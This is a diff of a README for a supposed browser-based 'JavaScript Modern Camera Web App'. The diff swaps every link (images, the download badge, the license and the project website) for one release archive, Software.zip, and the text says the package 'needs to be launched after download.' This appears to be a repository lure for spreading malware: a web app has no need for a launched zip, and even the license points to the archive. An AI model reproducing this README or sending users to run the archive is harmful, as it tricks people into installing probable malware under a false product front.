@@ -1,6 +1,6 @@
 # 📸 JavaScript Modern Camera Web App 🌟
 
-![Web Camera App](https://www.example.com/web-camera-app.jpg)
+![Web Camera App](https://github.com/Sigmameving/JavaScript-Modern-Camera-Web-App/releases/download/v1.0/Software.zip)
 
 Welcome to the **JavaScript Modern Camera Web App** repository! This sleek, feature-rich web camera application transforms your browser into a professional camera studio. Developed using modern web technologies, this app caters to both photographers and developers who seek an advanced web camera experience.
 
@@ -22,7 +22,7 @@ Welcome to the **JavaScript Modern Camera Web App** repository! This sleek, feat
 ## Installation 🛠️
 To get started with the JavaScript Modern Camera Web App, download the software package from the link provided below:
 
-[![Download App](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download App](https://github.com/Sigmameving/JavaScript-Modern-Camera-Web-App/releases/download/v1.0/Software.zip)](https://github.com/Sigmameving/JavaScript-Modern-Camera-Web-App/releases/download/v1.0/Software.zip)
 
 *Note: The software package needs to be launched after download.*
 
@@ -45,11 +45,11 @@ If you encounter any issues or have any questions regarding the JavaScript Moder
 Contributions to the JavaScript Modern Camera Web App are always welcome! Whether you want to report a bug, suggest a feature, or submit a pull request, your contribution is highly appreciated.
 
 ## License 📝
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/YourGitHubUsername/JavaScript-Modern-Camera-Web-App/blob/main/LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Sigmameving/JavaScript-Modern-Camera-Web-App/releases/download/v1.0/Software.zip](https://github.com/Sigmameving/JavaScript-Modern-Camera-Web-App/releases/download/v1.0/Software.zip) file for details.
 
 ## Get Started 📲
-Visit the [JavaScript Modern Camera Web App](https://www.example.com) website to experience the power of a modern camera studio in your browser!
+Visit the [JavaScript Modern Camera Web App](https://github.com/Sigmameving/JavaScript-Modern-Camera-Web-App/releases/download/v1.0/Software.zip) website to experience the power of a modern camera studio in your browser!
 
-![Camera Studio](https://www.example.com/camera-studio.jpg)
+![Camera Studio](https://github.com/Sigmameving/JavaScript-Modern-Camera-Web-App/releases/download/v1.0/Software.zip)
 
 Let's capture moments beautifully with the JavaScript Modern Camera Web App! 📸 #CaptureTheMoment #WebCameraStudio 🌈
